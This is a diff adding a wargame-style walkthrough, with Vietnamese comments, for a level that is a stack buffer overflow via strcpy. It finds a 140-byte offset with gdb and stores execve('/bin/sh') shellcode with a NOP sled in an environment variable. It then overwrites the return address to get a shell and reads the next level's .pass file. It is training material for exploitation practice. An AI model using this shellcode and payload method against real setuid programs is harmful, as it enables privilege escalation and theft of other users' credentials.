@@ -1,0 +1,48 @@
+# Level 5 - Payload / Command
+# Lỗ hổng: strcpy(buf, argv[1]) không kiểm tra bound -> tràn buffer -> ghi
+# đè return address trên stack (offset 140 byte từ đầu buf).
+
+# 1. Đọc source + tìm offset bằng gdb
+cat /levels/level05.c
+gdb /levels/level05
+disas main
+# -> lea -0x88(%ebp),%eax   : địa chỉ buf
+# -> offset tới return address = 0x88 (đến ebp) + 4 (saved EBP) = 140 byte
+quit
+
+# 2. Nhúng shellcode + NOP sled vào biến môi trường
+export SHELLCODE=$(python2 -c 'print "\x90"*100 + "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"')
+
+# 3. Tìm địa chỉ thật của biến SHELLCODE (phải làm trong /tmp vì /levels
+#    không ghi file được với quyền level5)
+mkdir -p /tmp/toan_lv5
+cd /tmp/toan_lv5
+cat > getenvaddr.c << 'EOF'
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+    char *ptr;
+    if(argc < 3) {
+        printf("Usage: %s <bien_moi_truong> <duong_dan_chuong_trinh_dich>\n", argv[0]);
+        exit(0);
+    }
+    ptr = getenv(argv[1]);
+    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
+    printf("%s se o dia chi %p\n", argv[1], ptr);
+    return 0;
+}
+EOF
+gcc -m32 -o getenvaddr getenvaddr.c
+./getenvaddr SHELLCODE /levels/level05
+# -> SHELLCODE sẽ ở địa chỉ 0xbffffdb3
+
+# 4. Payload thật: 140 byte NOP + 4 byte địa chỉ little-endian
+#    (0xbffffdb3 -> \xb3\xfd\xff\xbf)
+/levels/level05 $(python2 -c 'print "\x90"*140 + "\xb3\xfd\xff\xbf"')
+# -> in ra 1 dòng ký tự lạ (buf chứa NOP, không phải lỗi) rồi shell mới
+
+# 5. Trong shell mới:
+id
+cat /home/level6/.pass
